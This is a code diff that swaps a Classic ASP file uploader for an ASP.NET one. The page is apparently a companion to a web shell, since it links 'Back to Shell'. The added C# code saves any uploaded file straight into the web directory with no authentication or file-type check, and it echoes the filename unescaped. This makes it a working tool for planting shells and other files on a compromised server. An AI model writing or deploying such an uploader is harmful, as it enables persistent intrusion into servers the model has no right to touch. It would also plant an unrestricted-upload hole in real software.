@@ -1,62 +1,52 @@
-<%@ Language=VBScript %>
-<%
-Response.Buffer = True
-On Error Resume Next
-
-Dim output
-output = ""
-
-' ===================== UPLOAD HANDLING =====================
-If Request.ServerVariables("REQUEST_METHOD") = "POST" Then
-    Dim fso, stream, fileName, savePath, binaryData
-    
-    Set fso = Server.CreateObject("Scripting.FileSystemObject")
-    
-    fileName = Request.Form("file") ' yeh sirf naam deta hai
-    
-    If Len(fileName) > 0 Then
-        savePath = Server.MapPath(".") & "\" & fso.GetFileName(fileName)
-        
-        binaryData = Request.BinaryRead(Request.TotalBytes)
-        
-        Set stream = Server.CreateObject("ADODB.Stream")
-        stream.Type = 1 ' adTypeBinary
-        stream.Open
-        stream.Write binaryData
-        stream.SaveToFile savePath, 2 ' adSaveCreateOverWrite
-        stream.Close
-        
-        If Err.Number = 0 Then
-            output = "✅ File successfully uploaded: " & fso.GetFileName(savePath)
-        Else
-            output = "❌ Upload Failed: " & Err.Description & " (Error #" & Err.Number & ")"
-        End If
-    Else
-        output = "No file selected."
-    End If
-End If
-
-On Error GoTo 0
-%>
-
+<%@ Page Language="C#" Debug="true" %>
 <html>
 <head>
-    <title>Classic ASP Uploader</title>
-    <style>body{font-family:monospace; background:#111; color:#0f0;}</style>
+    <title>Uploader</title>
+    <style>
+        body {font-family:monospace; background:#112; color:#0f0; padding:20px;}
+        .status {font-size:16px; padding:10px; background:#222;}
+    </style>
 </head>
 <body>
-    <h2>Classic ASP Uploader</h2>
+    <h2>ASP.NET File Uploader</h2>
     
-    <form method="post" enctype="multipart/form-data">
-        <input type="file" name="file" />
-        <input type="submit" value="Upload File" />
+    <form method="post" enctype="multipart/form-data" runat="server">
+        <asp:FileUpload ID="File1" runat="server" />
+        <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />
+        <br><br>
+        <div class="status">
+            <asp:Label ID="lblResult" runat="server" />
+        </div>
     </form>
+
+    <script runat="server">
+        protected void btnUpload_Click(object sender, EventArgs e)
+        {
+            if (File1.HasFile)
+            {
+                try
+                {
+                    string filename = System.IO.Path.GetFileName(File1.FileName);
+                    string path = Server.MapPath("./") + filename;
+                    
+                    File1.SaveAs(path);
+                    lblResult.Text = "✅ SUCCESS! File uploaded: <b>" + filename + "</b>";
+                    lblResult.ForeColor = System.Drawing.Color.Lime;
+                }
+                catch (Exception ex)
+                {
+                    lblResult.Text = "❌ ERROR: " + ex.Message;
+                    lblResult.ForeColor = System.Drawing.Color.Red;
+                }
+            }
+            else
+            {
+                lblResult.Text = "Please choose a file.";
+            }
+        }
+    </script>
     
     <hr>
-    <pre><%= Server.HTMLEncode(output) %></pre>
-    
-    <% If output = "" Then %>
-        <p>Upload karke dekho...</p>
-    <% End If %>
+    <a href="your_shell_file.asp">← Back to Shell</a>
 </body>
 </html>
